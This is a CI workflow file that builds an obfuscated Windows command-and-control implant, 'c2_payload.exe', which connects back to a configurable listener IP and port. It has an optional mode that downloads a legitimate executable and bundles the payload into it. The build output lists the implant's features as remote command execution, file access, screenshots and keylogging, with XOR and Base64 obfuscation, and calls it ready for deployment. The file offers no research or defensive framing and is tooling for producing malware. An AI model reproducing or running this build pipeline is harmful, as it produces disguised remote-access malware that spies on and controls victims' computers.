name: Build C2 Windows PE Binary

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
    inputs:
      obfuscation_level:
        description: 'Niveau obfuscation (1-5)'
        required: false
        default: '5'
      listener_ip:
        description: 'IP Listener'
        required: false
        default: '0.0.0.0'
      patch_url:
        description: 'URL fichier .exe √† patcher (optionnel)'
        required: false
        default: ''
      listener_port:
        description: 'Port Listener'
        required: false
        default: '4444'

jobs:
  build-windows:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python 3.11
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller
    
    - name: Read build configuration
      id: config
      shell: pwsh
      run: |
        if (Test-Path build_config.json) {
          $config = Get-Content build_config.json | ConvertFrom-Json
          echo "listener_ip=$($config.listener_ip)" >> $env:GITHUB_OUTPUT
          echo "listener_port=$($config.listener_port)" >> $env:GITHUB_OUTPUT
          echo "obfuscation_level=$($config.obfuscation_level)" >> $env:GITHUB_OUTPUT
          if ($config.PSObject.Properties.Name -contains 'patch_url') {
            echo "patch_url=$($config.patch_url)" >> $env:GITHUB_OUTPUT
          } else {
            echo "patch_url=" >> $env:GITHUB_OUTPUT
          }
          Write-Host "Config from build_config.json:"
          Write-Host "  IP: $($config.listener_ip)"
          Write-Host "  Port: $($config.listener_port)"
          Write-Host "  Obfuscation: $($config.obfuscation_level)"
          if ($config.PSObject.Properties.Name -contains 'patch_url') {
            Write-Host "  Patch URL: $($config.patch_url)"
          }
        } else {
          echo "listener_ip=${{ github.event.inputs.listener_ip || '192.168.1.1' }}" >> $env:GITHUB_OUTPUT
          echo "listener_port=${{ github.event.inputs.listener_port || '4444' }}" >> $env:GITHUB_OUTPUT
          echo "obfuscation_level=${{ github.event.inputs.obfuscation_level || '2' }}" >> $env:GITHUB_OUTPUT
          echo "patch_url=${{ github.event.inputs.patch_url || '' }}" >> $env:GITHUB_OUTPUT
          Write-Host "Using default/manual inputs"
        }
    
    - name: Prepare patch file (optional)
      if: ${{ steps.config.outputs.patch_url != '' }}
      shell: pwsh
      run: |
        $url = "${{ steps.config.outputs.patch_url }}"
        try {
          $u = [System.Uri]$url
          $fileName = [System.IO.Path]::GetFileName($u.AbsolutePath)
          if ([string]::IsNullOrWhiteSpace($fileName)) { $fileName = "patch_target.exe" }
        } catch { $fileName = "patch_target.exe" }
        Write-Host "Downloading patch file: $url"
        Invoke-WebRequest -Uri $url -OutFile $fileName
        if (-not (Test-Path $fileName)) {
          Write-Host "‚ùå Failed to download patch file"; exit 1
        }
        Write-Host "Downloaded to: $fileName"
    
    - name: Build C2 Binary
      shell: pwsh
      run: |
        $ip = "${{ steps.config.outputs.listener_ip }}"
        $port = [int]"${{ steps.config.outputs.listener_port }}"
        $obf = [int]"${{ steps.config.outputs.obfuscation_level }}"
        $patch = Get-ChildItem -File -Name 2>$null | Where-Object { $_.ToLower().EndsWith('.exe') -and $_ -ne 'c2_payload.exe' } | Select-Object -First 1
        if ($patch) {
          Write-Host "Building in PATCH mode with: $patch"
          python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('$ip', $port, $obf, 'windows', '$patch')"
        } else {
          Write-Host "Building standard C2 payload"
          python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('$ip', $port, $obf, 'windows')"
        }
    
    - name: Verify PE binary format
      shell: pwsh
      run: |
        $bytes = [System.IO.File]::ReadAllBytes("dist\c2_payload.exe")
        $magic = "{0:X2}{1:X2}" -f $bytes[0], $bytes[1]
        Write-Host "üìä Magic bytes: $magic"
        if ($magic -eq "4D5A") {
          Write-Host "‚úÖ Valid PE x64 binary!"
          Write-Host "üéâ C2 payload compiled successfully!"
        } else {
          Write-Host "‚ùå Invalid PE format!"
          exit 1
        }
    
    - name: Display binary info
      shell: pwsh
      run: |
        $file = "dist\c2_payload.exe"
        $size = (Get-Item $file).Length / 1MB
        Write-Host "üì¶ Binary information:"
        Write-Host "  ‚îú‚îÄ Name: c2_payload.exe"
        Write-Host "  ‚îú‚îÄ Size: $([Math]::Round($size, 2)) MB"
        Write-Host "  ‚îú‚îÄ Format: PE x64 (Windows)"
        Write-Host "  ‚îú‚îÄ Status: ‚úÖ Ready for deployment"
        Write-Host "  ‚îú‚îÄ Features: cmd, files, screenshots, keylogger"
        Write-Host "  ‚îî‚îÄ Obfuscation: Level 2 (XOR + Base64 + Delays)"
    
    - name: Upload Windows binary
      uses: actions/upload-artifact@v4
      with:
        name: c2-payload-windows
        path: dist/c2_payload.exe
        retention-days: 30

    - name: Smoke test executables (SELFTEST)
      if: ${{ always() }}
      shell: pwsh
      run: |
        Write-Host "Running smoke tests on built executables with SELFTEST=1..."
        $ErrorActionPreference = 'Stop'
        $exes = Get-ChildItem -Path dist -Filter *.exe -File -ErrorAction SilentlyContinue
        if (-not $exes) {
          Write-Host "No .exe files found in dist/. Skipping self-test."
          exit 0
        }
        $fail = 0
        foreach ($exe in $exes) {
          Write-Host "Testing: $($exe.FullName)"
          $env:SELFTEST = '1'
          & $exe.FullName
          $code = $LASTEXITCODE
          Write-Host "Exit code: $code"
          if ($code -ne 0) { $fail = 1 }
        }
        if ($fail -ne 0) {
          Write-Host "‚ùå One or more executables failed self-test"
          exit 1
        } else {
          Write-Host "‚úÖ All executables passed self-test"
        }
